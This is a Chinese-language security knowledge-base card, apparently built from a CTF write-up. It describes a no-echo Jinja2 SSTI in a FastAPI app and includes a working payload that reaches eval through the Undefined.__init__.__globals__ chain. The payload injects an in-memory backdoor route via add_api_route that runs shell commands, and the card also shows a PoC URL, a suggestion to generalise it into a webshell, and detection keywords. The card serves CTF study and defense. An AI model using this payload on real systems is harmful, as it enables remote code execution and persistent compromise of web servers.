---
id: web-python-framework-fastapi-jinja2-ssti-add-api-route-memshell
title: FastAPI + Jinja2 SSTI 无回显：request.__class__.__init__.__globals__ 取 sys/eval，app.add_api_route 注入内存马
type: scenario
domain: web
path: web/python/framework
technique: fastapi-jinja2-ssti-add-api-route-memshell
tags:
- web
- python
- fastapi
- jinja2
- ssti
- memshell
- route-injection
- no-echo
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V275
  verified_at: '2026-11-07T23:17:28+08:00'
  notes: 已对照原文核对：/calc 数字/%/非ASCII/access 过滤、payload 结构与图02 请求一致，图03 /abcd?abcd=123 回显 flag{2f5a3b1b-...}；原理段已修正为：render 上下文只有 {app} 时 request 由 Jinja2 解析为 Undefined，Undefined.__init__.__globals__ 为 jinja2.runtime 模块命名空间（3.1.2 中 import sys），经本机 jinja2 3.1.2 实测该链可取 sys/eval；原文截图命令为 cat /f*、正文写 cat /flag，卡片按正文。未验证点：未复跑 FastAPI 靶场；frontmatter 无 sources/source_url；原文仅有依赖版本（FastAPI 0.112.0/Jinja2 3.1.2/uvicorn 0.30.5），非组件受影响版本区间，未设 affected_versions。
url: /docs/web/python/framework/web-python-framework-fastapi-jinja2-ssti-add-api-route-memshell/
draft: false
kb_aliases:
- FastAPI Jinja2 SSTI
- calc_req SSTI
- add_api_route 内存马
- request.__class__.__init__.__globals__
- 无回显 SSTI 路由注入
- 巅峰极客 GoldenHornKing
---

## 一句话结论

FastAPI 应用把用户参数直接拼进 `jinja2.Environment(loader=BaseLoader()).from_string(f"{{{{ {calc_req} }}}}").render({"app": app})`，虽然过滤了数字、`%` 和非 ASCII 字符且没有回显，但攻击者仍可用 `request.__class__.__init__.__globals__['sys'].modules['builtins']['eval'](...)` 取得 `eval`，在 eval 中导入 `sys`、取 `__main__.app` 并调用 `app.add_api_route("/abcd", lambda abcd: __import__("os").popen("cat /flag").read(), methods=["GET"])` 动态注册一条后门路由；随后访问 `/abcd?abcd=123` 即可执行命令并回显 flag。这条路由只存在于进程内存，重启前一直有效。

## 原理

- **SSTI 入口**：`/calc` 路由把 `calc_req` 直接插入 Jinja2 模板并 render；过滤器只拒绝“包含数字”“包含 `%`”“非 ASCII”以及第二次访问（`access` 标志），并没有沙箱化模板或限制对象属性访问。
- **为什么用 `request` 取 globals**：本题 render 时上下文只有 `{"app": app}`，并未注入 `request`；Jinja2 会把未定义名字解析为 `jinja2.runtime.Undefined`，而 `Undefined.__init__` 是定义在 `jinja2/runtime.py` 里的 Python 函数，其 `__globals__` 就是 `jinja2.runtime` 模块命名空间（3.1.2 中该模块 `import sys`），因此 `request.__class__.__init__.__globals__['sys'].modules['builtins']['eval']` 仍可取到 `sys` 与 `eval`，绕过模板内建函数限制。若目标用 `Jinja2Templates.TemplateResponse` 注入 Starlette `Request`，同一表达式取到的则是 `starlette.requests` 模块的 globals，也能作为取 `sys` 的入口之一。
- **为什么不用数字/`%`**：payload 中所有路径都用字符串键（`'sys'`、`'builtins'`、`'eval'`、`'__main__'`、`'os'`），命令 `cat /flag` 不含数字，`add_api_route`/`methods=["GET"]` 也不含数字，因此过滤不触发；`%` 也无需使用（Jinja2 的 `{% %}` 语法被避免）。
- **动态注册路由**：FastAPI/Starlette 允许运行期 `app.add_api_route(path, endpoint, methods=[...])`，没有 Flask 的 `setupmethod` 首请求后禁注册限制；新路由只追加到 `app.router.routes`，不落盘，属于内存马。lambda handler 在请求时执行 `os.popen("cat /flag").read()` 并返回结果。
- **无回显怎么拿结果**：原 `/calc` 虽然 render 结果被丢弃、只返回 `fight`，但新路由是完整的 HTTP endpoint，访问时会直接返回 handler 的返回值，因此不需要 SSTI 回显。
- **为什么成立**：模板注入 + 可经 Undefined/上下文对象拿到模块 globals + FastAPI 运行期路由注册，三者组合把“无回显的表达式执行”升级为“可交互的进程内 webshell”；命令执行发生在 Web 进程权限下。

## 触发条件

- FastAPI + Jinja2 应用使用 `from_string`/`Template` 拼接用户输入，且未使用 `SandboxedEnvironment` 或属性白名单。
- 模板上下文暴露 `app` 等对象，或存在未定义变量（Jinja2 `Undefined.__init__.__globals__` 可作取模块 globals 的入口）；过滤器只做弱字符黑名单（数字/`%`/ASCII）而不是语义限制。
- FastAPI 实例在 `__main__` 或可导入模块的全局变量中（本卡为 `__main__.app`），且可运行期注册路由。
- 攻击者能访问应用端口，并能请求新注册的路径；应用为单进程或需对每个 worker 分别注入。

## 利用步骤

1. 访问 `/` 或源码泄露确认 Jinja2 版本、`calc_req` 拼进模板、过滤条件（数字/`%`/非 ASCII/`access`）。
2. 构造无数字/无 `%` 的 payload：
   ```text
   request.__class__.__init__.__globals__['sys'].modules['builtins']['eval']('__import__("sys").modules["__main__"].__dict__["app"].add_api_route("/abcd",lambda abcd:__import__("os").popen("cat /flag").read(),methods=["GET"])')
   ```
   URL 编码后作为 `calc_req` 发送到 `/calc`；响应 `fight` 表示模板已执行。
3. 访问 `GET /abcd?abcd=123`，新路由的 lambda 执行 `cat /flag` 并返回输出，得到 flag。
4. 若 `__main__.app` 不存在，遍历 `sys.modules` 找 FastAPI 实例（见关联卡），或改用 `app.router.add_api_route`；若 `request` 名字或 Undefined 链不可用，尝试 `self`/`cycler`/`namespace` 等 Jinja2 全局。
5. 清理/持久化：路由仅内存，进程重启消失；可注册多条不同路径或把 handler 改为通用命令执行/文件读取。

## PoC

原文 payload（HackBar URL，未做 URL 编码的原始形式）：

```text
http://<target>:8000/calc?calc_req=request.__class__.__init__.__globals__['sys'].modules['builtins']['eval']('__import__("sys").modules["__main__"].__dict__["app"].add_api_route("/abcd",lambda abcd:__import__("os").popen("cat /flag").read(),methods=["GET"])')
```

```text
响应：fight
访问：http://<target>:8000/abcd?abcd=123
响应：flag{2f5a3b1b-13ea-4161-a879-7307d6e54cbb}
```

> 说明：原文截图显示 payload 发送后返回 `fight`，`/abcd?abcd=123` 回显 flag；未在本机复现。本例如上，`request` 实为未定义名字（Undefined），利用的是 `jinja2.runtime` 的 globals；若上下文注入真实 `Request`，取到的模块 globals 不同，需按目标调整。

## 变体与关联

- **FastAPI 路由内存马通用卡**：[[web-python-framework-fastapi-sys-modules-route-memshell]] 覆盖“遍历 `sys.modules` 找 FastAPI 实例 + `@app.get`/`add_api_route` 注册后门路由”的通用技术；本卡新增的是 Jinja2 SSTI 无回显入口与 `request.__class__.__init__.__globals__` 取 `sys`/`eval` 的具体 payload，二者可组合使用。
- **Jinja2 SSTI 变体**：[[web-python-ssti-jinja2-flask-globals-rce]]、[[web-python-ssti-jinja2-subclasses-index-rce]]、[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]] 覆盖 Flask 上下文/子类/属性过滤绕过；本卡是 Jinja2 表达式经 `__init__.__globals__` 取 `sys` + FastAPI 路由注册，不依赖 Flask 的 `config`/`url_for`。
- **无回显 SSTI**：[[web-python-ssti-jinja2-boolean-error-blind]] 用布尔/报错盲注；本卡直接把结果写进新路由，避免盲注。
- 边界：模板被 `SandboxedEnvironment` 限制、上下文不含 `request`/`app`、`__main__` 中无 FastAPI 实例、或进程多 worker 时，需调整 payload/逐个注入。

## 检测与防御

- 修复：不要用用户输入构造 Jinja2 模板；使用 `SandboxedEnvironment` 并限制属性/函数访问；render 上下文最小化（不要暴露 `request`/`app`/`config`）；对 `add_api_route` 等运行期路由注册做审计。
- 加固：升级 FastAPI/Jinja2 并跟踪安全公告；WAF 检测模板注入特征（`__class__`、`__globals__`、`__subclasses__`、`add_api_route`、`popen`）；限制 Web 进程权限与出站。
- 检测：请求参数中出现 `__class__`/`__globals__`/`__builtins__`/`eval`/`add_api_route`/`popen`；运行期出现未知路由（`/abcd` 等）或路由数量变化；Web 进程执行 `cat /flag`/shell 子进程；OpenAPI 文档/路由表与磁盘代码不一致。
- 该场景为 CTF/授权测试；生产环境应把模板渲染当作代码执行面，而不是普通字符串拼接。
